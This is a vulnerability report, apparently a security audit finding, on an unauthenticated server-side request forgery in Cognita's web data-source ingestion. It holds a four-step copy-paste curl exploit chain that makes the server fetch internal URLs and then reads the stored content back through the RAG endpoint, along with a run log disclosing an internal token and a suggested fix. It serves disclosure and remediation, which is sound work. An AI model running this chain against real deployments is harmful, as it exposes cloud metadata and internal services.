# Cognita web ingestion: unauthenticated SSRF — server fetches attacker-chosen URLs and makes the content RAG-queryable

**Verification: DYNAMICALLY-REPRODUCED** (full chain over real HTTP: register internal URL → ingest → server fetch observed at the internal listener → content stored and returned by unauthenticated RAG query; output below is from the actual run)

## Reproduction conditions

- Cognita source snapshot (backend FastAPI app), Python 3.12, WSL2 Ubuntu 24.04, PostgreSQL + Qdrant via docker per the project's compose services, Playwright chromium installed (required by the web parser)
- No authentication (see the collections report) — attacker is anyone who can reach the API port
- The internal-only target in the run is a local listener on `127.0.0.1:9999` standing in for link-local/intranet services (e.g. `169.254.169.254` cloud metadata, internal admin panels); it logs every request it receives
- Repro environment substitutions (model providers only, **zero changes to cognita code**): local OpenAI-compatible stubs for embedder/LLM/unstructured endpoints (no external API keys available to the audit machine)

## Description

`POST /v1/data_source` accepts `{"type": "web", "uri": "<any http/https URL>"}` — the only check is the URL scheme (`backend/modules/dataloaders/web_loader.py:73`). There is **no host allowlist, no private-range/IP blocking, no redirect policy**. During ingestion the server itself performs `session.head(url)` and `session.get(url)` (`web_loader.py:86,120`), hands the response body to the web parser (headless browser), chunks it, and stores it in the collection's vector store, where the same unauthenticated client can read it back via the RAG endpoint.

## Impact

Unauthenticated SSRF with content exfiltration: the server fetches attacker-chosen internal addresses (cloud metadata endpoints, intranet services, administrative interfaces) and **persists the fetched content as a queryable collection** that the attacker then reads back through the product's own retrieval API — a full internal-content disclosure primitive, not a blind SSRF.

## PoC (copy-paste ready — four steps; the old 2-step PoC in earlier revisions never triggered ingestion and did not work)

```bash
# 1. register an internal-only URL as a web data source (no auth)
curl -X POST http://<cognita>:8000/v1/data_source -H "Content-Type: application/json" \
  -d '{"type":"web","uri":"http://<internal-host>:9999/internal-only",
       "metadata":{"use_sitemap":false},"parser_config":{}}'

# 2. create a collection bound to it
curl -X POST http://<cognita>:8000/v1/collections -H "Content-Type: application/json" \
  -d '{"name":"ssrf-coll","embedder_config":{"name":"<configured embedder>","parameters":{}},
       "associated_data_sources":[{"data_source_fqn":"web::http://<internal-host>:9999/internal-only",
                                   "parser_config":{}}]}'

# 3. trigger ingestion — the SERVER fetches the internal URL
curl -X POST http://<cognita>:8000/v1/collections/ingest -H "Content-Type: application/json" \
  -d '{"collection_name":"ssrf-coll","data_source_fqn":"web::http://<internal-host>:9999/internal-only",
       "run_as_job":false}'

# 4. read the fetched internal content back via RAG (no auth)
curl -X POST http://<cognita>:8000/retrievers/basic-rag/answer -H "Content-Type: application/json" \
  -d '{"collection_name":"ssrf-coll","query":"What is the internal token?",
       "model_configuration":{"name":"<configured llm>","parameters":{}},
       "prompt_template":"...{context}...{question}...",
       "retriever_name":"vectorstore",
       "retriever_config":{"search_type":"similarity","search_kwargs":{"k":5}},
       "stream":false,"internet_search_enabled":false}'
```

## Execution result (actual run)

```
POST /v1/data_source web      -> 201 {"data_source":{"type":"web","uri":"http://127.0.0.1:9999/internal-only",...}}
POST create ssrf-coll         -> 201
POST ingest                   -> 201 {"message":"triggered"}
qdrant points in ssrf-coll    -> 1

RAG answer                    -> HTTP 500, internal token disclosed: True
     response fragment: ...<body><pre>INTERNAL-ONLY content: cognita ssrf proof
                   token=INTERNAL-TOKEN-99</pre></body></html>')."}...

--- listener.log at the internal target (the SSRF itself) ---
[listener] 127.0.0.1 HEAD /internal-only
[listener] 127.0.0.1 GET  /internal-only
```

The internal-only listener received **two requests from the Cognita server process** (the loader's HEAD probe and content GET), and the fetched internal content was stored (`qdrant points = 1`) and returned to the unauthenticated client by the RAG query. (The answer endpoint wraps the retrieved Document in a 500 due to an unrelated pydantic v1/v2 serialization incompatibility in this snapshot; the fetched content is in the response body.)

## Suggested fix

Validate web data source URIs against a policy: resolve DNS and reject private/link-local/loopback/metadata ranges, enforce a redirect policy and response-size limit, and require authentication for data-source registration and ingestion.
